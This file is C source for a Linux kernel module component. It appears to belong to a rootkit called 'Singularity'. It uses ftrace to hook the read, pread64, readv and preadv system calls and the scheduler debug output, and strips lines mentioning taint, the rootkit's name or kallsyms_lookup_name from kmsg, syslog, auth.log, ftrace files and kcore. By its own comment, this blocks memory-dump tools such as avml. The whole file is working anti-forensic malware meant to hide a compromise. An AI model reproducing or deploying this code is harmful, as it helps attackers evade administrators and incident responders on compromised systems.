#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/clear_taint_dmesg.h"

#define MAX_CAP (64*1024)
#define MIN_KERNEL_READ 256

static const char *virtual_fs_types[] = {
    "proc",
    "procfs",
    "sysfs",
    "tracefs",
    "debugfs",
    NULL
};

static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_read_ia32)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_pread64)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_pread64_ia32)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_preadv)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_preadv_ia32)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_readv)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_readv_ia32)(const struct pt_regs *regs);
static int (*orig_sched_debug_show)(struct seq_file *m, void *v);

notrace static bool should_filter_file(const char *filename) {
    if (!filename)
        return false;
    return (strcmp(filename, "kmsg") == 0 ||
            strcmp(filename, "enabled_functions") == 0 ||
            strcmp(filename, "control") == 0 ||
            strcmp(filename, "debug") == 0 ||
            strcmp(filename, "trace") == 0 ||
           // strcmp(filename, "stat") == 0 ||
            strcmp(filename, "kern.log") == 0 ||
            strcmp(filename, "kern.log.1") == 0 ||
            strcmp(filename, "syslog") == 0 ||
            strcmp(filename, "auth.log") == 0 ||
            strcmp(filename, "auth.log.1") == 0 ||
            strcmp(filename, "syslog.1") == 0 ||
            strcmp(filename, "kcore") == 0 || //temp fix to avoid memory dump using tools like avml
            strcmp(filename, "touched_functions") == 0);
}

notrace static bool is_kmsg_device(const char *filename) {
    if (!filename)
        return false;
    return strcmp(filename, "kmsg") == 0;
}

notrace static bool line_contains_sensitive_info(const char *line) {
    if (!line)
        return false;
    return (strstr(line, "taint") != NULL ||
            strstr(line, "journal") != NULL ||
            strstr(line, "singularity") != NULL ||
            strstr(line, "Singularity") != NULL ||
            strstr(line, "matheuz") != NULL ||
            strstr(line, "zer0t") != NULL ||
            strstr(line, "kallsyms_lookup_name") != NULL ||
            strstr(line, "obliviate") != NULL);
}

notrace static bool is_virtual_file(struct file *file) {
    if (!file || !file->f_path.mnt || !file->f_path.mnt->mnt_sb || !file->f_path.mnt->mnt_sb->s_type)
        return false;
    const char *fsname = file->f_path.mnt->mnt_sb->s_type->name;
    if (!fsname)
        return false;
    for (int i = 0; virtual_fs_types[i]; i++) {
        if (strcmp(fsname, virtual_fs_types[i]) == 0)
            return true;
    }
    return false;
}

notrace static ssize_t filter_buffer_content(char __user *user_buf, ssize_t bytes_read) {
    if (bytes_read <= 0 || !user_buf)
        return bytes_read;

    if (bytes_read > MAX_CAP)
        bytes_read = MAX_CAP;

    char *kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
    if (!kernel_buf)
        return -ENOMEM;

    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
        kfree(kernel_buf);
        return -EFAULT;
    }
    kernel_buf[bytes_read] = '\0';

    char *partial_line = NULL;
    size_t partial_len = 0;

    size_t total_len = partial_len + bytes_read;
    char *total_buf = kmalloc(total_len + 1, GFP_KERNEL);
    if (!total_buf) {
        kfree(kernel_buf);
        return -ENOMEM;
    }
    if (partial_line && partial_len > 0) {
        memcpy(total_buf, partial_line, partial_len);
    }
    memcpy(total_buf + partial_len, kernel_buf, bytes_read);
    total_buf[total_len] = '\0';

    char *filtered_buf = kzalloc(total_len + 1, GFP_KERNEL);
    if (!filtered_buf) {
        kfree(kernel_buf);
        kfree(total_buf);
        return -ENOMEM;
    }

    size_t filtered_len = 0;
    char *line_start = total_buf;
    char *line_end;
    size_t leftover_len = 0;

    while ((line_end = strchr(line_start, '\n'))) {
        size_t line_len = line_end - line_start;
        char saved = line_end[0];
        line_end[0] = '\0';
        if (!line_contains_sensitive_info(line_start)) {
            if (filtered_len + line_len + 1 <= total_len) {
                memcpy(filtered_buf + filtered_len, line_start, line_len);
                filtered_len += line_len;
                filtered_buf[filtered_len++] = '\n';
            }
        }
        line_end[0] = saved;
        line_start = line_end + 1;
    }

    leftover_len = strlen(line_start);

    if (filtered_len == 0) {
        kfree(kernel_buf);
        kfree(total_buf);
        kfree(filtered_buf);
        return 0;
    }

    if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
        kfree(kernel_buf);
        kfree(total_buf);
        kfree(filtered_buf);
        return -EFAULT;
    }

    kfree(kernel_buf);
    kfree(total_buf);
    kfree(filtered_buf);
    return filtered_len;
}

notrace static ssize_t filter_kmsg_line(char __user *user_buf, ssize_t bytes_read) {
    if (bytes_read <= 0 || !user_buf)
        return bytes_read;

    char *kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
    if (!kernel_buf)
        return bytes_read;

    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
        kfree(kernel_buf);
        return bytes_read;
    }
    kernel_buf[bytes_read] = '\0';

    ssize_t ret = line_contains_sensitive_info(kernel_buf) ? 0 : bytes_read;

    kfree(kernel_buf);
    return ret;
}

notrace static ssize_t read_and_filter(struct file *file, char __user *user_buf, size_t user_count) {
    ssize_t to_read;
    ssize_t got;
    char *kbuf = NULL;
    char *filtered = NULL;
    loff_t pos;
    ssize_t ret = 0;

    if (!file || !user_buf)
        return -EFAULT;

    if (user_count <= 1)
        return 0;

    if (is_virtual_file(file)) {
        return -EOPNOTSUPP;
    }

    to_read = user_count;
    if (to_read < MIN_KERNEL_READ)
        to_read = MIN_KERNEL_READ;
    if (to_read > MAX_CAP)
        to_read = MAX_CAP;

    kbuf = kmalloc(to_read + 1, GFP_KERNEL);
    if (!kbuf)
        return -ENOMEM;

    pos = file->f_pos;
    got = kernel_read(file, kbuf, to_read, &pos);
    if (got < 0) {
        kfree(kbuf);
        return -EOPNOTSUPP;
    }

    file->f_pos = pos;

    if (got == 0) {
        kfree(kbuf);
        return 0;
    }

    if (got > to_read)
        got = to_read;
    kbuf[got] = '\0';

    char *partial_line = NULL;
    size_t partial_len = 0;

    size_t total_len = partial_len + got;
    char *total_buf = kmalloc(total_len + 1, GFP_KERNEL);
    if (!total_buf) {
        kfree(kbuf);
        return -ENOMEM;
    }
    if (partial_line && partial_len > 0) {
        memcpy(total_buf, partial_line, partial_len);
    }
    memcpy(total_buf + partial_len, kbuf, got);
    total_buf[total_len] = '\0';

    filtered = kzalloc(total_len + 1, GFP_KERNEL);
    if (!filtered) {
        kfree(kbuf);
        kfree(total_buf);
        return -ENOMEM;
    }

    size_t filtered_len = 0;
    char *line_start = total_buf;
    char *line_end;
    size_t leftover_len = 0;

    while ((line_end = strchr(line_start, '\n'))) {
        size_t l = line_end - line_start;
        char saved = line_end[0];
        line_end[0] = '\0';
        if (!line_contains_sensitive_info(line_start)) {
            if (filtered_len + l + 1 <= total_len) {
                memcpy(filtered + filtered_len, line_start, l);
                filtered_len += l;
                filtered[filtered_len++] = '\n';
            }
        }
        line_end[0] = saved;
        line_start = line_end + 1;
    }

    leftover_len = strlen(line_start);

    if (filtered_len == 0) {
        kfree(kbuf);
        kfree(total_buf);
        kfree(filtered);
        return 0;
    }

    size_t to_copy = (filtered_len > user_count) ? user_count : filtered_len;
    if (copy_to_user(user_buf, filtered, to_copy)) {
        kfree(kbuf);
        kfree(total_buf);
        kfree(filtered);
        return -EFAULT;
    }

    ret = (ssize_t)to_copy;
    kfree(kbuf);
    kfree(total_buf);
    kfree(filtered);
    return ret;
}

static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
    if (!orig_read)
        return -EINVAL;

    int fd = regs->di;
    char __user *user_buf = (char __user *)regs->si;
    size_t count = (size_t)regs->dx;

    if (!user_buf)
        return -EFAULT;

    struct file *file = fget(fd);
    if (!file)
        return orig_read(regs);

    const char *filename = NULL;
    if (file->f_path.dentry)
        filename = file->f_path.dentry->d_name.name;

    if (!should_filter_file(filename)) {
        fput(file);
        return orig_read(regs);
    }

    bool is_kmsg = is_kmsg_device(filename);
    ssize_t res = 0;

    if (is_kmsg) {
        do {
            res = orig_read(regs);
            if (res <= 0)
                break;
            res = filter_kmsg_line(user_buf, res);
        } while (res == 0);
        fput(file);
        return res;
    }

    res = read_and_filter(file, user_buf, count);
    if (res == -EOPNOTSUPP) {
        ssize_t orig_res = orig_read(regs);
        if (orig_res <= 0) {
            fput(file);
            return orig_res;
        }
        res = filter_buffer_content(user_buf, orig_res);
        fput(file);
        return res;
    }

    fput(file);
    return res;
}

static notrace asmlinkage ssize_t hook_read_ia32(const struct pt_regs *regs) {
    if (!orig_read_ia32)
        return -EINVAL;

    int fd = regs->bx;
    char __user *user_buf = (char __user *)regs->cx;
    size_t count = (size_t)regs->dx;

    if (!user_buf)
        return -EFAULT;

    struct file *file = fget(fd);
    if (!file)
        return orig_read_ia32(regs);

    const char *filename = NULL;
    if (file->f_path.dentry)
        filename = file->f_path.dentry->d_name.name;

    if (!should_filter_file(filename)) {
        fput(file);
        return orig_read_ia32(regs);
    }

    bool is_kmsg = is_kmsg_device(filename);
    ssize_t res = 0;

    if (is_kmsg) {
        do {
            res = orig_read_ia32(regs);
            if (res <= 0)
                break;
            res = filter_kmsg_line(user_buf, res);
        } while (res == 0);
        fput(file);
        return res;
    }

    res = read_and_filter(file, user_buf, count);
    if (res == -EOPNOTSUPP) {
        ssize_t orig_res = orig_read_ia32(regs);
        if (orig_res <= 0) {
            fput(file);
            return orig_res;
        }
        res = filter_buffer_content(user_buf, orig_res);
        fput(file);
        return res;
    }

    fput(file);
    return res;
}

static notrace asmlinkage ssize_t hook_pread64(const struct pt_regs *regs) {
    if (!orig_pread64)
        return -EINVAL;

    int fd = regs->di;
    char __user *user_buf = (char __user *)regs->si;
    size_t count = (size_t)regs->dx;

    if (!user_buf)
        return -EFAULT;

    struct file *file = fget(fd);
    if (!file)
        return orig_pread64(regs);

    const char *filename = NULL;
    if (file->f_path.dentry)
        filename = file->f_path.dentry->d_name.name;

    if (!should_filter_file(filename)) {
        fput(file);
        return orig_pread64(regs);
    }

    bool is_kmsg = is_kmsg_device(filename);
    ssize_t res = 0;

    if (is_kmsg) {
        do {
            res = orig_pread64(regs);
            if (res <= 0)
                break;
            res = filter_kmsg_line(user_buf, res);
        } while (res == 0);
        fput(file);
        return res;
    }

    res = read_and_filter(file, user_buf, count);
    if (res == -EOPNOTSUPP) {
        ssize_t orig_res = orig_pread64(regs);
        if (orig_res <= 0) {
            fput(file);
            return orig_res;
        }
        res = filter_buffer_content(user_buf, orig_res);
        fput(file);
        return res;
    }

    fput(file);
    return res;
}

static notrace asmlinkage ssize_t hook_pread64_ia32(const struct pt_regs *regs) {
    if (!orig_pread64_ia32)
        return -EINVAL;

    int fd = regs->bx;
    char __user *user_buf = (char __user *)regs->cx;
    size_t count = (size_t)regs->dx;

    if (!user_buf)
        return -EFAULT;

    struct file *file = fget(fd);
    if (!file)
        return orig_pread64_ia32(regs);

    const char *filename = NULL;
    if (file->f_path.dentry)
        filename = file->f_path.dentry->d_name.name;

    if (!should_filter_file(filename)) {
        fput(file);
        return orig_pread64_ia32(regs);
    }

    bool is_kmsg = is_kmsg_device(filename);
    ssize_t res = 0;

    if (is_kmsg) {
        do {
            res = orig_pread64_ia32(regs);
            if (res <= 0)
                break;
            res = filter_kmsg_line(user_buf, res);
        } while (res == 0);
        fput(file);
        return res;
    }

    res = read_and_filter(file, user_buf, count);
    if (res == -EOPNOTSUPP) {
        ssize_t orig_res = orig_pread64_ia32(regs);
        if (orig_res <= 0) {
            fput(file);
            return orig_res;
        }
        res = filter_buffer_content(user_buf, orig_res);
        fput(file);
        return res;
    }

    fput(file);
    return res;
}

static notrace asmlinkage ssize_t hook_preadv(const struct pt_regs *regs) {
    if (!orig_preadv)
        return -EINVAL;

    int fd = regs->di;
    struct iovec __user *iov = (struct iovec __user *)regs->si;
    unsigned long vlen = regs->dx;

    if (!iov || vlen == 0)
        return -EFAULT;

    struct file *file = fget(fd);
    if (!file)
        return orig_preadv(regs);

    const char *filename = NULL;
    if (file->f_path.dentry)
        filename = file->f_path.dentry->d_name.name;

    if (!should_filter_file(filename)) {
        fput(file);
        return orig_preadv(regs);
    }

    ssize_t orig_res = orig_preadv(regs);
    if (orig_res <= 0) {
        fput(file);
        return orig_res;
    }

    bool is_kmsg = is_kmsg_device(filename);
    if (is_kmsg) {
        struct iovec iov_copy;
        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
            fput(file);
            return orig_res;
        }
        ssize_t filtered = filter_kmsg_line(iov_copy.iov_base, orig_res);
        fput(file);
        return filtered;
    }

    struct iovec iov_copy;
    if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
        fput(file);
        return orig_res;
    }

    ssize_t filtered = filter_buffer_content(iov_copy.iov_base, orig_res);
    fput(file);
    return filtered;
}

static notrace asmlinkage ssize_t hook_preadv_ia32(const struct pt_regs *regs) {
    if (!orig_preadv_ia32)
        return -EINVAL;

    int fd = regs->bx;
    struct iovec __user *iov = (struct iovec __user *)regs->cx;
    unsigned long vlen = regs->dx;

    if (!iov || vlen == 0)
        return -EFAULT;

    struct file *file = fget(fd);
    if (!file)
        return orig_preadv_ia32(regs);

    const char *filename = NULL;
    if (file->f_path.dentry)
        filename = file->f_path.dentry->d_name.name;

    if (!should_filter_file(filename)) {
        fput(file);
        return orig_preadv_ia32(regs);
    }

    ssize_t orig_res = orig_preadv_ia32(regs);
    if (orig_res <= 0) {
        fput(file);
        return orig_res;
    }

    bool is_kmsg = is_kmsg_device(filename);
    if (is_kmsg) {
        struct iovec iov_copy;
        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
            fput(file);
            return orig_res;
        }
        ssize_t filtered = filter_kmsg_line(iov_copy.iov_base, orig_res);
        fput(file);
        return filtered;
    }

    struct iovec iov_copy;
    if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
        fput(file);
        return orig_res;
    }

    ssize_t filtered = filter_buffer_content(iov_copy.iov_base, orig_res);
    fput(file);
    return filtered;
}

static notrace asmlinkage ssize_t hook_readv(const struct pt_regs *regs) {
    if (!orig_readv)
        return -EINVAL;

    int fd = regs->di;
    struct iovec __user *iov = (struct iovec __user *)regs->si;
    unsigned long vlen = regs->dx;

    if (!iov || vlen == 0)
        return -EFAULT;

    struct file *file = fget(fd);
    if (!file)
        return orig_readv(regs);

    const char *filename = NULL;
    if (file->f_path.dentry)
        filename = file->f_path.dentry->d_name.name;

    if (!should_filter_file(filename)) {
        fput(file);
        return orig_readv(regs);
    }

    ssize_t orig_res = orig_readv(regs);
    if (orig_res <= 0) {
        fput(file);
        return orig_res;
    }

    bool is_kmsg = is_kmsg_device(filename);
    if (is_kmsg) {
        struct iovec iov_copy;
        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
            fput(file);
            return orig_res;
        }
        ssize_t filtered = filter_kmsg_line(iov_copy.iov_base, orig_res);
        fput(file);
        return filtered;
    }

    struct iovec iov_copy;
    if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
        fput(file);
        return orig_res;
    }

    ssize_t filtered = filter_buffer_content(iov_copy.iov_base, orig_res);
    fput(file);
    return filtered;
}

static notrace asmlinkage ssize_t hook_readv_ia32(const struct pt_regs *regs) {
    if (!orig_readv_ia32)
        return -EINVAL;

    int fd = regs->bx;
    struct iovec __user *iov = (struct iovec __user *)regs->cx;
    unsigned long vlen = regs->dx;

    if (!iov || vlen == 0)
        return -EFAULT;

    struct file *file = fget(fd);
    if (!file)
        return orig_readv_ia32(regs);

    const char *filename = NULL;
    if (file->f_path.dentry)
        filename = file->f_path.dentry->d_name.name;

    if (!should_filter_file(filename)) {
        fput(file);
        return orig_readv_ia32(regs);
    }

    ssize_t orig_res = orig_readv_ia32(regs);
    if (orig_res <= 0) {
        fput(file);
        return orig_res;
    }

    bool is_kmsg = is_kmsg_device(filename);
    if (is_kmsg) {
        struct iovec iov_copy;
        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
            fput(file);
            return orig_res;
        }
        ssize_t filtered = filter_kmsg_line(iov_copy.iov_base, orig_res);
        fput(file);
        return filtered;
    }

    struct iovec iov_copy;
    if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
        fput(file);
        return orig_res;
    }

    ssize_t filtered = filter_buffer_content(iov_copy.iov_base, orig_res);
    fput(file);
    return filtered;
}

static notrace int hook_sched_debug_show(struct seq_file *m, void *v) {
    if (!orig_sched_debug_show || !m)
        return -EINVAL;

    size_t buf_size = 8192;
    char *buf = kzalloc(buf_size, GFP_KERNEL);
    if (!buf)
        return orig_sched_debug_show(m, v);

    struct seq_file tmp_seq = *m;
    tmp_seq.buf = buf;
    tmp_seq.size = buf_size;
    tmp_seq.count = 0;

    int ret = orig_sched_debug_show(&tmp_seq, v);

    if (m->buf) {
        char *line = buf;
        char *line_ptr;
        while ((line_ptr = strchr(line, '\n'))) {
            *line_ptr = '\0';
            if (!line_contains_sensitive_info(line))
                seq_printf(m, "%s\n", line);
            line = line_ptr + 1;
        }
        if (*line && !line_contains_sensitive_info(line))
            seq_printf(m, "%s", line);
    }

    kfree(buf);
    return ret;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_read", hook_read, &orig_read),
    HOOK("__ia32_sys_read", hook_read_ia32, &orig_read_ia32),
    HOOK("__x64_sys_pread64", hook_pread64, &orig_pread64),
    HOOK("__ia32_sys_pread64", hook_pread64_ia32, &orig_pread64_ia32),
    HOOK("__x64_sys_readv", hook_readv, &orig_readv),
    HOOK("__ia32_sys_readv", hook_readv_ia32, &orig_readv_ia32),
    HOOK("__x64_sys_preadv", hook_preadv, &orig_preadv),
    HOOK("__ia32_sys_preadv", hook_preadv_ia32, &orig_preadv_ia32),
    HOOK("sched_debug_show", hook_sched_debug_show, &orig_sched_debug_show),
};

notrace int clear_taint_dmesg_init(void) {
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void clear_taint_dmesg_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
